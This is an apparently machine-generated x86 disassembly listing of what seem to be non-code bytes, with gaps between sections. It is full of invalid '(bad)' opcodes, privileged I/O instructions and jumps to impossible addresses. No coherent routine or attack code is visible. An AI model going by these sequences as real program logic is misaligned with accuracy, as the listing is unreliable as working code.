  42f1a7:	loope  0x42f180
  42f1a9:	push   esp
  42f1aa:	and    eax,0x456bbfc3
  42f1af:	pop    ss
  42f1b0:	dec    ebp
  42f1b1:	dec    esi
  42f1b2:	scas   eax,DWORD PTR es:[edi]
  42f1b3:	inc    ecx
  42f1b4:	jl     0x42f141
  42f1b6:	aad    0x9c
  42f1b8:	mov    ecx,0x5ce29f30
  42f1bd:	shl    ch,cl
  42f1bf:	inc    ecx
  42f1c0:	sbb    al,0x3c
  42f1c2:	mov    esi,0x5033a0f8
  42f1c7:	fsin   
  42f1c9:	retf   
  42f1ca:	stos   BYTE PTR es:[edi],al
  42f1cb:	cmp    DWORD PTR [edi+0x7982502c],eax
  42f1d1:	push   ds
  42f1d2:	or     eax,0xda10ac8b
  42f1d7:	dec    esp
  42f1d8:	pop    ss
  42f1d9:	dec    ebp
  42f1da:	mov    ecx,0x9a0aa699
  42f1df:	ret    
  42f1e0:	loope  0x42f1b9
  42f1e2:	or     DWORD PTR [edx],ecx
  42f1e4:	bound  ebx,QWORD PTR [eax-0x61]
  42f1e7:	jle    0x42f220
  42f1e9:	add    eax,0x6ed3ff
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	cmp    edi,esp
  42f264:	(bad)  
  42f265:	jg     0x42f2ac
  42f267:	clc    
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	inc    DWORD PTR [eax]
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	push   eax
  42f26f:	pop    esp
  42f270:	ffreep st(0)
  42f272:	push   edx
  42f273:	loop   0x42f2ae
  42f275:	sub    al,0xd2
  42f277:	mov    al,0x38
  42f279:	xchg   DWORD PTR [ecx],ecx
  42f27b:	clc    
  42f27c:	xchg   esp,eax
  42f27d:	pop    esp
  42f27e:	adc    BYTE PTR [ebx+0xe66079c],dh
  42f284:	pop    ecx
  42f285:	push   ebp
  42f286:	adc    bl,BYTE PTR [esi+esi*2-0x39]
  42f28a:	jle    0x42f2b8
  42f28c:	inc    edi
  42f28d:	sti    
  42f28e:	test   eax,0xbd770161
  42f293:	xchg   edi,eax
  42f294:	mov    bl,0x6b
  42f296:	jmp    0x42f239
  42f298:	mov    edx,0x7ac5cbe2
  42f29d:	(bad)
  42f2a3:	(bad)  
  42f2a4:	out    dx,eax
  42f2a5:	cld    
  42f2a6:	stc    
  42f2a7:	loope  0x42f29d
  42f2a9:	shr    DWORD PTR [edi+0x738d908b],0x1d
  42f2b0:	cmp    dl,BYTE PTR [esi+0x50606d88]
  42f2b6:	rcl    ch,cl
  42f2b8:	jo     0x42f302
  42f2ba:	cmp    dl,ch
  42f2bc:	inc    edi
  42f2bd:	adc    ecx,DWORD PTR [ecx]
  42f2bf:	std    
  42f2c0:	sub    ebp,ebx
  42f2c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2c3:	mov    edi,0xe50efacc
  42f2c8:	jecxz  0x42f255
  42f2ca:	dec    edi
  42f2cb:	dec    ebx
  42f2cc:	xor    DWORD PTR [eax-0x47],ebx
  42f2cf:	int3   
  42f2d0:	sbb    eax,0xfcebc197
  42f2d5:	int    0xb0
  42f2d7:	mov    ecx,0xae014e7d
  42f2dc:	and    al,0x3b
  42f2de:	pop    ds
  42f2df:	out    0x97,al
  42f2e1:	(bad)  [eax-0x397554df]
  42f2e7:	sub    al,0xfe
  42f2e9:	mov    ecx,0xb19b5ae3
  42f2ee:	push   ss
  42f2ef:	xor    al,0xff
  42f2f1:	mov    ebx,0x1bb99f6b
  42f2f6:	outs   dx,BYTE PTR ds:[esi]
  42f2f7:	test   BYTE PTR [edx+0x2eb4ca69],dh
  42f2fd:	jnp    0x42f2e3
  42f2ff:	jmp    0x98b1a29e
  42f304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f305:	popf   
  42f306:	in     eax,0x3a
  42f308:	pop    es
  42f309:	ret    
  42f30a:	in     eax,dx
  42f30b:	loop   0x42f2c2
  42f30d:	pop    es
  42f30e:	jnp    0x42f2a1
  42f310:	push   0x7a7af33e
  42f315:	jb     0x42f383
  42f317:	(bad)  
  42f319:	mov    ah,0x20
  42f31b:	and    eax,0x6a4c873c
  42f320:	out    dx,al
  42f321:	or     eax,0xd222c91f
  42f326:	sbb    bl,bh
  42f328:	sbb    eax,0xe870d0ec
  42f32d:	push   ecx
  42f32e:	sti    
  42f32f:	cdq    
  42f330:	push   cs
  42f331:	xchg   DWORD PTR [edx+0x20],ecx
  42f334:	aam    0xeb
  42f336:	adc    al,ch
  42f338:	mov    edx,0xeb03c44b
  42f33d:	cli    
  42f33e:	mov    BYTE PTR ds:0x5152a655,ch
  42f344:	imul   edx,DWORD PTR [ecx],0x6704983b
  42f34a:	cld    
  42f34b:	jmp    0xc47:0xc0c8d855
  42f352:	(bad)  
  42f353:	scas   al,BYTE PTR es:[edi]
  42f354:	or     dh,cl
  42f356:	stos   BYTE PTR es:[edi],al
  42f357:	push   edi
  42f358:	xchg   ebx,eax
  42f359:	jae    0x42f3aa
  42f35b:	cmp    BYTE PTR [eax],0x81
  42f35e:	or     eax,0xa63698e1
  42f363:	stos   BYTE PTR es:[edi],al
  42f364:	popa   
  42f365:	das    
  42f366:	adc    bh,BYTE PTR [eax-0x63]
  42f369:	or     edi,ebp
  42f36b:	addr16 and al,0x0
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	inc    ecx
  42f3e3:	mov    al,0x11
  42f3e5:	dec    esi
  42f3e6:	inc    esp
  42f3e7:	stc    
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	inc    DWORD PTR [eax]
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	shl    BYTE PTR ds:0x1b3b8d0b,cl
  42f3f4:	sub    DWORD PTR [eax],ebx
  42f3f6:	jne    0x42f37a
  42f3f8:	lar    edx,dx
  42f3fb:	jg     0x42f44e
  42f3fd:	ins    BYTE PTR es:[edi],dx
  42f3fe:	jnp    0x42f3c9
  42f400:	mov    ebp,0xd3e591fc
  42f405:	jmp    0x30cd02fa
  42f40a:	jmp    0x9b6f4cb3
  42f40f:	add    dh,ah
  42f411:	lahf   
  42f412:	adc    eax,0x320df353
  42f417:	xlat   BYTE PTR gs:[ebx]
  42f419:	pop    ds
  42f41a:	and    BYTE PTR [edx],0x15
  42f41d:	out    0x79,eax
  42f41f:	call   FWORD PTR [edx-0x390464b1]
  42f425:	mov    bh,bh
  42f427:	and    DWORD PTR [ecx+0x24bedd27],eax
  42f42d:	hlt    
  42f42e:	jmp    0x42f42b
  42f430:	inc    ebp
  42f431:	adc    ecx,0xae9e9435
  42f437:	jne    0x42f493
  42f439:	add    DWORD PTR [eax-0xa435e12],edx
  42f43f:	imul   edx,edi,0xeabfbe6d
  42f445:	sub    BYTE PTR [edx+0xd],cl
  42f448:	push   cs
  42f449:	into   
  42f44a:	xor    DWORD PTR [ebp+ebp*4-0x77],0xc53694fb
  42f452:	mov    DWORD PTR [esi+0x6a],edi
  42f455:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f457:	test   eax,0xfcab9a63
  42f45c:	ror    DWORD PTR [eax+0x2e],1
  42f45f:	cld    
  42f460:	int    0x1d
  42f462:	in     al,0x8f
  42f464:	jle    0x42f422
  42f466:	cs pushf 
  42f468:	ret    
  42f469:	dec    ebx
  42f46a:	aam    0x97
  42f46c:	or     al,0x24
  42f46e:	(bad)  
  42f46f:	aad    0x94
  42f471:	call   0xbf7ea9cf
  42f476:	je     0x42f478
  42f478:	int    0xc2
  42f47a:	stos   BYTE PTR es:[edi],al
  42f47b:	jecxz  0x42f428
  42f47d:	lods   al,BYTE PTR gs:[esi]
  42f47f:	adc    al,0x24
  42f481:	fldenv [ebx]
  42f483:	fwait
  42f484:	imul   ebx,DWORD PTR [ebx-0x7ee6dac5],0xffffffe2
  42f48b:	lahf   
  42f48c:	dec    eax
  42f48d:	xor    al,0xd2
  42f48f:	adc    eax,DWORD PTR [ebx+0x5d3a6c20]
  42f495:	outs   dx,BYTE PTR ds:[esi]
  42f496:	cs mov ecx,0x365f824a
  42f49c:	jl     0x42f487
  42f49e:	imul   ecx,DWORD PTR [eax+0x626555f8],0x5324b9e7
  42f4a8:	lds    esp,FWORD PTR [ecx+0x22]
  42f4ab:	jg     0x42f463
  42f4ad:	jp     0x42f499
  42f4af:	or     esi,DWORD PTR fs:[ebx-0x2f4da702]
  42f4b6:	sbb    eax,0x9ebe9922
  42f4bb:	mov    esp,DWORD PTR [ebx]
  42f4bd:	jge    0x42f48c
  42f4bf:	clc    
  42f4c0:	addr16 sbb eax,0x84db5d6e
  42f4c6:	xchg   ecx,eax
  42f4c7:	(bad)  
  42f4c8:	sbb    dl,BYTE PTR fs:[eax-0x37d890a1]
  42f4cf:	and    dl,ch
  42f4d1:	inc    ebp
  42f4d2:	stos   DWORD PTR es:[edi],eax
  42f4d3:	mov    edx,0x95c357a
  42f4d9:	adc    al,BYTE PTR [ebx-0x10]
  42f4dc:	ins    BYTE PTR es:[edi],dx
  42f4dd:	push   edx
  42f4de:	dec    BYTE PTR [edx-0x28]
  42f4e1:	pop    ds
  42f4e2:	shr    BYTE PTR [eax+esi*4-0x1b],cl
  42f4e6:	sub    eax,edx
  42f4e8:	lea    esi,[esi]
  42f4ea:	shl    esp,1
  42f4ec:	pop    edx
	...
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	or     BYTE PTR [edx+ebx*8],dh
  42f565:	retf   0xfa43
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	inc    DWORD PTR [eax]
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	fwait
  42f56f:	std    
  42f570:	jmp    0x42f579
  42f572:	loop   0x42f5f3
  42f574:	sbb    cl,ch
  42f576:	sub    ebp,edx
  42f578:	out    0x6,al
  42f57a:	xchg   ecx,eax
  42f57b:	dec    esp
  42f57c:	ret    
  42f57d:	push   edx
  42f57e:	aad    0xd5
  42f580:	cmc    
  42f581:	fcomp  QWORD PTR [edx+0x6f]
  42f584:	dec    edi
  42f585:	loop   0x42f508
  42f587:	or     eax,0x2cebabf6
  42f58c:	or     eax,0xd00bb52a
  42f591:	imul   ebp,DWORD PTR [edi+0x60],0x1e
  42f595:	jp     0x42f58a
  42f597:	ret    
  42f598:	cmp    DWORD PTR [ebp+0x2a],edi
  42f59b:	aaa    
  42f59c:	sub    BYTE PTR [eax-0x4686d01d],dh
  42f5a2:	jb     0x42f5a4
  42f5a4:	les    esi,FWORD PTR [eax+0x563e59e7]
  42f5aa:	xchg   ebx,eax
  42f5ab:	out    dx,eax
  42f5ac:	js     0x42f595
  42f5ae:	sahf   
  42f5af:	and    cl,BYTE PTR [eax]
  42f5b1:	cmp    eax,DWORD PTR [edx-0xb]
  42f5b4:	xchg   ecx,eax
  42f5b5:	adc    DWORD PTR [ecx+0x2052079f],eax
  42f5bb:	or     BYTE PTR [edx],ah
  42f5bd:	lahf   
  42f5be:	xlat   BYTE PTR ds:[ebx]
  42f5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5c0:	stos   BYTE PTR es:[edi],al
  42f5c1:	or     al,BYTE PTR [ebp-0x7dcc3da3]
  42f5c7:	(bad)  
  42f5c8:	hlt    
  42f5c9:	mov    ecx,esi
  42f5cb:	push   edx
  42f5cc:	push   0xffffffd6
  42f5ce:	neg    DWORD PTR [ebx]
  42f5d0:	loop   0x42f5da
  42f5d2:	or     DWORD PTR [ebp+0x2de60e4a],ebp
  42f5d8:	pushf  
  42f5d9:	push   esi
  42f5da:	and    al,0x4b
  42f5dc:	xor    al,BYTE PTR [edi]
  42f5de:	add    ebx,DWORD PTR [edx]
  42f5e0:	push   esi
  42f5e1:	xchg   edx,eax
  42f5e2:	not    DWORD PTR [esi+edi*1+0x19bee5b7]
  42f5e9:	xor    bl,al
  42f5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5ec:	add    al,0xc1
  42f5ee:	xchg   DWORD PTR [esi+edx*1-0x17],edi
  42f5f2:	sub    eax,0x2805da3d
  42f5f7:	lods   al,BYTE PTR ds:[esi]
  42f5f8:	dec    ecx
  42f5f9:	jns    0x42f60f
  42f5fb:	mov    bh,0xeb
  42f5fd:	les    esi,FWORD PTR [edx+0x8]
  42f600:	pop    ecx
  42f601:	jecxz  0x42f642
  42f603:	xchg   esp,eax
  42f604:	and    edi,DWORD PTR [ecx-0x14120880]
  42f60a:	test   al,0xef
  42f60c:	xchg   edx,eax
  42f60d:	jmp    0x42f5c0
  42f60f:	jae    0x42f618
  42f611:	mov    bl,0xf7
  42f613:	push   edx
  42f614:	(bad)  
  42f615:	mov    dl,0xc1
  42f617:	push   0xa4de5210
  42f61c:	fadd   DWORD PTR [ebx-0x3d67dfcb]
  42f622:	push   edi
  42f623:	lahf   
  42f624:	aaa    
  42f625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f626:	sbb    BYTE PTR [edx],0x0
  42f629:	(bad)  
  42f62a:	mov    ds:0x71b31fd5,eax
  42f62f:	mov    WORD PTR [ebp-0x6ce29555],fs
  42f635:	repz leave 
  42f637:	inc    eax
  42f638:	sub    bh,BYTE PTR [edx-0x73]
  42f63b:	fwait
  42f63c:	mov    ch,0x22
  42f63e:	fst    DWORD PTR [edx*2-0x45fc16ab]
  42f645:	add    edx,eax
  42f647:	inc    esi
  42f648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f649:	jae    0x42f60f
  42f64b:	xor    eax,0x91b23558
  42f650:	lds    eax,FWORD PTR [eax+0x71]
  42f653:	push   DWORD PTR [eax+0x3a]
  42f656:	lock not BYTE PTR [edx-0x4171355f]
  42f65d:	mov    WORD PTR [ecx-0x77],fs
  42f660:	jno    0x42f6ae
  42f662:	fimul  DWORD PTR [eax]
  42f664:	jl     0x42f60a
  42f666:	xor    al,0x13
  42f668:	xchg   edi,eax
  42f669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f66a:	stc    
  42f66b:	in     al,0xf8
	...
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	sub    eax,0x424427f1
  42f6e7:	sti    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	inc    DWORD PTR [eax]
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	mov    DWORD PTR [ecx+ebx*1+0x538d7791],ecx
  42f6f5:	addr16 xchg esi,eax
  42f6f7:	xchg   ebp,eax
  42f6f8:	sub    eax,0xb04bfafb
  42f6fd:	dec    edi
  42f6fe:	loope  0x42f6d5
  42f700:	cmp    ch,ah
  42f702:	pop    ss
  42f703:	mov    esi,0x1b8f6709
  42f708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f709:	xchg   esi,eax
  42f70a:	lea    edx,[edi+0x3c]
  42f70d:	xchg   ecx,eax
  42f70e:	and    al,0x90
  42f710:	jnp    0x42f738
  42f712:	lea    eax,[edi+0x6]
  42f715:	or     esi,DWORD PTR [edx+0x45]
  42f718:	jae    0x42f6c2
  42f71a:	je     0x42f6d0
  42f71c:	mov    WORD PTR [edx],ds
  42f71e:	mov    ebp,0x423abb91
  42f723:	mov    edx,0x411f889
  42f728:	les    eax,FWORD PTR [edi]
  42f72a:	(bad)  
  42f72b:	test   BYTE PTR [ecx-0x2dedb929],0x56
  42f732:	and    eax,0x27a493bc
  42f737:	shl    BYTE PTR [eax],0xcd
  42f73a:	jo     0x42f76b
  42f73c:	idiv   esi
  42f73e:	iret   
  42f73f:	test   eax,0xabf5df29
  42f744:	mov    ecx,0xabecac96
  42f749:	clc    
  42f74a:	xchg   edi,eax
  42f74b:	stos   DWORD PTR es:[edi],eax
  42f74c:	mov    esp,0x43aed46a
  42f751:	ds push ecx
  42f753:	dec    esp
  42f754:	pop    edx
  42f755:	icebp  
  42f756:	std    
  42f757:	stos   DWORD PTR es:[edi],eax
  42f758:	loope  0x42f71e
  42f75a:	xchg   esi,eax
  42f75b:	idiv   DWORD PTR [ecx-0x14]
  42f75e:	shr    BYTE PTR [ecx-0x61e4ab5e],0x91
  42f765:	scas   al,BYTE PTR es:[di]
  42f767:	mov    bl,0xb2
  42f769:	mov    WORD PTR [eax],ds
  42f76b:	pop    esi
  42f76c:	mul    BYTE PTR [esi-0x2d]
  42f76f:	add    cl,BYTE PTR [ebx+edi*4-0x46]
  42f773:	daa    
  42f774:	cld    
  42f775:	sbb    edi,DWORD PTR [ecx+esi*4]
  42f778:	inc    bl
  42f77a:	add    DWORD PTR [edi+0x6],0x25
  42f77e:	stos   BYTE PTR es:[edi],al
  42f77f:	stos   DWORD PTR es:[edi],eax
  42f780:	xchg   esp,eax
  42f781:	fidiv  DWORD PTR [eax]
  42f783:	mov    eax,0x4e82a192
  42f788:	gs pop esp
  42f78a:	lods   al,BYTE PTR ds:[esi]
  42f78b:	pop    ds
  42f78c:	imul   DWORD PTR [eax-0x50]
  42f78f:	xchg   ebp,eax
  42f790:	jmp    0xe941:0xceaac6ef
  42f797:	add    al,0xe0
  42f799:	cmp    cl,BYTE PTR [edx+edi*1-0x47a02c53]
  42f7a0:	scas   al,BYTE PTR es:[edi]
  42f7a1:	cmovge ecx,DWORD PTR [ebp+0x49]
  42f7a5:	(bad)  
  42f7a6:	and    DWORD PTR [ebp+0x79],ebp
  42f7a9:	stc    
  42f7aa:	(bad)  
  42f7ac:	pusha  
  42f7ad:	mov    eax,0x4bf85502
  42f7b2:	pop    esp
  42f7b3:	ins    BYTE PTR es:[edi],dx
  42f7b4:	test   al,0x54
  42f7b6:	cmp    al,0xc0
  42f7b8:	dec    ebx
  42f7b9:	call   FWORD PTR [eax-0x53]
  42f7bc:	rol    ecx,cl
  42f7be:	fmul   st,st(3)
  42f7c0:	sbb    edi,DWORD PTR [eax-0x44a88821]
  42f7c6:	xchg   esp,eax
  42f7c7:	pop    ecx
  42f7c8:	push   ecx
  42f7c9:	pop    esi
  42f7ca:	mov    BYTE PTR [edi+edx*4-0x24733127],dl
  42f7d1:	mov    eax,0xa5b6c3d4
  42f7d6:	stos   DWORD PTR es:[edi],eax
  42f7d7:	pop    esp
  42f7d8:	(bad)  
  42f7d9:	shl    BYTE PTR [ecx],cl
  42f7db:	or     BYTE PTR [ebp+0x5f],dh
  42f7de:	cdq    
  42f7df:	retf   
  42f7e0:	in     al,0x3b
  42f7e2:	pusha  
  42f7e3:	retf   0x72cc
  42f7e6:	xor    ch,BYTE PTR [edx-0x4b715550]
  42f7ec:	out    dx,eax
	...
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xbdc39f41
  42f866:	inc    ecx
  42f867:	cld    
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	inc    DWORD PTR [eax]
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	push   eax
  42f86f:	push   ebx
  42f870:	mov    al,ds:0xa0637e26
  42f875:	mov    dh,0xc1
  42f877:	call   0x32140ac2
  42f87c:	loope  0x42f85a
  42f87e:	and    al,0xb6
  42f880:	data16 ffree st(5)
  42f883:	pushf  
  42f884:	stos   DWORD PTR es:[edi],eax
  42f885:	cmp    esi,0x28
  42f888:	aas    
  42f889:	mov    ah,0x2f
  42f88b:	sub    bh,dh
  42f88d:	cmp    DWORD PTR [edi+0xbe2fba],esi
  42f893:	imul   esi,DWORD PTR [edx+0x69],0xffffff9a
  42f897:	or     ecx,0x182528ca
  42f89d:	addr16 pop ebx
  42f89f:	dec    edx
  42f8a0:	xchg   BYTE PTR [esi+0x4c],ah
  42f8a3:	out    0x7e,eax
  42f8a5:	scas   al,BYTE PTR es:[edi]
  42f8a6:	je     0x42f881
  42f8a8:	cmp    eax,0xa078469f
  42f8ad:	adc    cl,BYTE PTR [edx-0x2e]
  42f8b0:	sar    DWORD PTR [edx+edx*8+0x34],cl
  42f8b4:	aas    
  42f8b5:	adc    bh,ah
  42f8b7:	out    0x1,eax
  42f8b9:	outs   dx,DWORD PTR ds:[esi]
  42f8ba:	cmp    bh,dl
  42f8bc:	in     al,0xf4
  42f8be:	pop    ecx
  42f8bf:	ror    BYTE PTR [ebx],0xa8
  42f8c2:	out    dx,eax
  42f8c3:	jns    0x42f911
  42f8c5:	jge    0x42f868
  42f8c7:	dec    edi
  42f8c8:	push   cs
  42f8c9:	and    al,0x5d
  42f8cb:	xor    eax,0xece41f10
  42f8d0:	fwait
  42f8d1:	call   0xb9b:0x3455203d
  42f8d8:	mov    al,0x74
  42f8da:	xor    eax,0x74775c94
  42f8df:	jno    0x42f91e
  42f8e1:	cmp    BYTE PTR [ebx+0x6270cc7d],al
  42f8e7:	mov    bl,0x73
  42f8e9:	pop    ebx
  42f8ea:	out    0x98,eax
  42f8ec:	mov    esi,0xb9e1d878
  42f8f1:	mov    ds,WORD PTR ds:0x43fc823b
  42f8f7:	test   eax,0x62087d7c
  42f8fc:	ret    
  42f8fd:	xor    BYTE PTR ds:0x352917cb,cl
  42f903:	es jge 0x42f8bf
  42f906:	mov    bh,0x48
  42f908:	int    0xdb
  42f90a:	gs push ecx
  42f90c:	sbb    bh,bh
  42f90e:	push   esi
  42f90f:	xor    al,0xaf
  42f911:	fiadd  WORD PTR [edx+eax*8]
  42f914:	nop
  42f915:	enter  0x8810,0x32
  42f919:	mov    al,0x77
  42f91b:	dec    ebp
  42f91c:	popa   
  42f91d:	and    edx,DWORD PTR [esi]
  42f91f:	and    esp,DWORD PTR [edx]
  42f921:	mov    WORD PTR [edx+0x2a],fs
  42f924:	inc    esp
  42f925:	cli    
  42f926:	mov    ecx,0xd521690e
  42f92b:	sbb    eax,DWORD PTR [edx-0x5a]
  42f92e:	sbb    al,0xab
  42f930:	jo     0x42f8be
  42f932:	xchg   esi,eax
  42f933:	mov    ecx,0x1aaefb2c
  42f938:	or     al,0xe6
  42f93a:	xchg   edi,eax
  42f93b:	mov    eax,0xd35cf6a8
  42f940:	sti    
  42f941:	nop
  42f942:	scas   eax,DWORD PTR es:[edi]
  42f943:	(bad)  
  42f944:	dec    edx
  42f945:	xchg   BYTE PTR [edx],dl
  42f947:	dec    eax
  42f948:	adc    dh,BYTE PTR [eax-0x3b66403a]
  42f94e:	and    bh,BYTE PTR [esi+eax*2]
  42f951:	sbb    eax,0x6709ec0
  42f956:	mul    DWORD PTR [edi-0x4da9151f]
  42f95c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f95d:	sub    ch,BYTE PTR [ecx-0x48]
  42f960:	mov    dl,0xde
  42f962:	int3   
  42f963:	iret   
  42f964:	or     eax,0x1ec612cf
  42f969:	mov    dl,0x7
  42f96b:	lahf   
  42f96c:	pusha  
	...
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f995
  42f9e3:	mov    ds:0xfd4008dd,eax
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	inc    DWORD PTR [eax]
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	jns    0x42fa0c
  42f9f0:	adc    dl,dh
  42f9f2:	jbe    0x42f9f4
  42f9f4:	outs   dx,DWORD PTR ds:[esi]
  42f9f5:	rcr    ch,cl
  42f9f7:	dec    ebx
  42f9f8:	or     al,0xa2
  42f9fa:	js     0x42fa5e
  42f9fc:	das    
  42f9fd:	sbb    BYTE PTR [ecx],0x87
  42fa00:	fisubr WORD PTR [eax+0xc]
  42fa03:	pop    edi
  42fa04:	call   DWORD PTR [ecx-0x1f]
  42fa07:	lods   eax,DWORD PTR ds:[esi]
  42fa08:	lock cli 
  42fa0a:	adc    edi,esp
  42fa0c:	mov    ds:0x5dcea38,eax
  42fa11:	sub    BYTE PTR [eax-0x71],dh
  42fa14:	xor    edx,eax
  42fa16:	mov    ebp,0xfdc9eaa4
  42fa1b:	xchg   esi,eax
  42fa1c:	and    dl,BYTE PTR [edi]
  42fa1e:	push   edi
  42fa1f:	jno    0x42f9fc
  42fa21:	mov    edx,edi
  42fa23:	daa    
  42fa24:	mov    al,BYTE PTR [esi-0x4]
  42fa27:	mov    ah,BYTE PTR [eax]
  42fa29:	(bad)  [eax]
  42fa2b:	inc    eax
  42fa2c:	rol    DWORD PTR [edi],1
  42fa2e:	and    al,0xe7
  42fa30:	or     al,0xe7
  42fa32:	mov    esp,0xb6b89ee9
  42fa37:	add    DWORD PTR [esi],0xffffffaa
  42fa3a:	jo     0x42faa6
  42fa3c:	sbb    BYTE PTR [esi-0x1da77d40],dl
  42fa42:	cmc    
  42fa43:	sbb    dh,BYTE PTR [ebx-0x14]
  42fa46:	jge    0x42f9d9
  42fa48:	xor    edi,edi
  42fa4a:	xchg   ebx,eax
  42fa4b:	(bad)  [esi]
  42fa4d:	int    0xe3
  42fa4f:	out    0x64,al
  42fa51:	pop    ebx
  42fa52:	shl    BYTE PTR [eax+0x61],cl
  42fa55:	loop   0x42fad0
  42fa57:	sub    esi,DWORD PTR [ebp-0x15]
  42fa5a:	sbb    DWORD PTR [esi+edi*8-0x2],ecx
  42fa5e:	and    eax,0x113ca0f0
  42fa63:	push   ecx
  42fa64:	xchg   ebp,eax
  42fa65:	in     eax,0x14
  42fa67:	cs push edx
  42fa69:	dec    ecx
  42fa6a:	aaa    
  42fa6b:	les    ebx,FWORD PTR [edx+0x1e]
  42fa6e:	jmp    0x42fac8
  42fa70:	push   edx
  42fa71:	mov    dl,0xf5
  42fa73:	inc    ebx
  42fa74:	xor    eax,0x966d513f
  42fa79:	inc    edx
  42fa7a:	(bad)  [ebx+0x670ca180]
  42fa80:	and    bh,ch
  42fa82:	test   BYTE PTR [eax-0x4b],dh
  42fa85:	div    DWORD PTR [edi-0x60]
  42fa88:	pop    ds
  42fa89:	popf   
  42fa8a:	div    DWORD PTR [eax-0x568cb34c]
  42fa90:	dec    ecx
  42fa91:	mov    ?,WORD PTR [edx]
  42fa93:	stos   BYTE PTR es:[edi],al
  42fa94:	repz in al,0xb2
  42fa97:	jnp    0x42fa81
  42fa99:	mov    cl,0x85
  42fa9b:	mov    ds:0x18ddf3fe,eax
  42faa0:	out    dx,al
  42faa1:	test   DWORD PTR [ecx],edi
  42faa3:	loopne 0x42fb20
  42faa5:	fild   DWORD PTR [eax]
  42faa7:	add    edi,esp
  42faa9:	mov    ch,0xf9
  42faab:	push   esi
  42faac:	test   eax,0xae5ab8b0
  42fab1:	adc    BYTE PTR [bp+si],dl
  42fab4:	nop
  42fab5:	or     al,0x90
  42fab7:	(bad)  
  42fab8:	pop    esi
  42fab9:	aas    
  42faba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fabb:	test   al,0xa0
  42fabd:	ins    DWORD PTR es:[edi],dx
  42fabe:	xchg   ebp,eax
  42fabf:	mov    cl,0x57
  42fac1:	mov    ss:0x5271b530,eax
  42fac7:	in     eax,0xbd
  42fac9:	imul   DWORD PTR ds:0x3d273af3
  42facf:	xchg   esp,eax
  42fad0:	inc    edi
  42fad1:	test   eax,0x9ba88fe5
  42fad6:	lea    edi,[ebp+0x36e0e93d]
  42fadc:	in     al,dx
  42fadd:	enter  0xcb90,0x7e
  42fae1:	push   eax
  42fae2:	aas    
  42fae3:	jns    0x42fa96
  42fae5:	push   ecx
  42fae6:	mov    ebp,?
  42fae8:	adc    eax,DWORD PTR [ebp+0x5de734]
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	adc    al,0x34
  42fb64:	lods   eax,DWORD PTR ds:[esi]
  42fb65:	cmp    BYTE PTR [edi],bh
  42fb67:	inc    BYTE PTR [ecx]
  42fb69:	add    bh,bh
  42fb6b:	add    BYTE PTR [eax],al
  42fb6d:	add    BYTE PTR [ecx+0x46],dl
  42fb70:	fwait
  42fb71:	jl     0x42fbde
  42fb73:	retf   0x48dc
  42fb76:	xchg   ecx,eax
  42fb77:	push   esp
  42fb78:	inc    esi
  42fb79:	xchg   edx,eax
  42fb7a:	push   esp
  42fb7b:	cmp    eax,0xe60a87cd
  42fb80:	outs   dx,DWORD PTR ds:[esi]
  42fb81:	fwait
  42fb82:	cmp    cl,ah
  42fb84:	mov    BYTE PTR ds:0xdcab35c0,dl
  42fb8a:	cmp    eax,0xcd2e6202
  42fb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb90:	js     0x42fbba
  42fb92:	xor    BYTE PTR [eax-0x7c],ah
  42fb95:	jbe    0x42fb6a
  42fb97:	vmwrite ecx,DWORD PTR [ecx-0x1f]
  42fb9b:	rol    DWORD PTR [esi],1
  42fb9d:	std    
  42fb9e:	xor    eax,0x9ae92962
  42fba3:	out    dx,eax
